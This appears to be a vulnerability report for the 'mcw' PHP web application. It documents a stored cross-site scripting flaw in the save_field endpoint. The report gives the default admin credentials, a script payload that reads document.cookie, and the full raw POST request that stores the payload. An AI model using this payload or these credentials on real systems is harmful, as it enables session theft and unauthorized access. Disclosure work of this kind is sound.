BUG_Author:sunyucheng

Vulnerability url: /mcw/classes/Master.php?f=save_field

POST form-data parameter name exists stored cross-site scripting

#### Steps to reproduce

1.Go to the admin Login

http://localhost/mcw/admin/login.php

Default Admin Access: Username: admin / Password: admin123

2.Click on "Field List" and Click on "+ Create New".

3.Put Payload into the Field Name

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/sunyucheng0405/bug_report/blob/main/xss1.png)

4.Click on Save

Transmission packet

```
POST /mcw/classes/Master.php?f=save_field HTTP/1.1
Host: localhost
Content-Length: 555
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWIRCYsmrR7zz9nDG
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/mcw/admin/?page=fields
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=3o0s1j8jkgqito3ks6rblb0g3f
Connection: close

------WebKitFormBoundaryWIRCYsmrR7zz9nDG
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryWIRCYsmrR7zz9nDG
Content-Disposition: form-data; name="category_id"

1
------WebKitFormBoundaryWIRCYsmrR7zz9nDG
Content-Disposition: form-data; name="name"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryWIRCYsmrR7zz9nDG
Content-Disposition: form-data; name="description"

a
------WebKitFormBoundaryWIRCYsmrR7zz9nDG
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryWIRCYsmrR7zz9nDG--
```

5.Payload will trigger when a user visits on http://localhost/mcw/admin/?page=fields

![image](https://github.com/sunyucheng0405/bug_report/blob/main/xss2.png)
